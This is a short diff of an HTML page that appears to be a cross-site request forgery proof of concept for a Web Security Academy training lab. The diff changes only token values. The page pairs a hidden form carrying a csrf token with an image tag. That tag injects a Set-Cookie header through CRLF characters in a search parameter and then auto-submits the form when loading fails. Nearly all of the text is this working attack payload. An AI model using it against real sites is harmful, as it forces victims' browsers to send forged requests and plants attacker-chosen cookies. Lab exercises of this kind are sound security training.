@@ -46,12 +46,12 @@
       <input
         type="hidden"
         name="csrf"
-        value="wgxUgru80MFDoINPiUBydPSxrDc7L4C2"
+        value="WxuquUjF4PLJw3gqlNFeeBtiwJbe5eJG"
       />
       <input type="submit" value="Submit request" />
     </form>
     <img
-      src="https://0ac100f8044f510280221782007e0095.web-security-academy.net/?search=test;%0d%0aSet-Cookie:%20csrfKey=nPGVjB1ptx0bZ7IFHGxuhq1OKFVffEuw%3b%20SameSite=None"
+      src="https://0ac100f8044f510280221782007e0095.web-security-academy.net/?search=test;%0d%0aSet-Cookie:%20csrfKey=mzPZAApkgnc0WGGfvMRcnhw6DNeBIzeq%3b%20SameSite=None"
       onerror="document.forms[0].submit()"
     />
   </body>
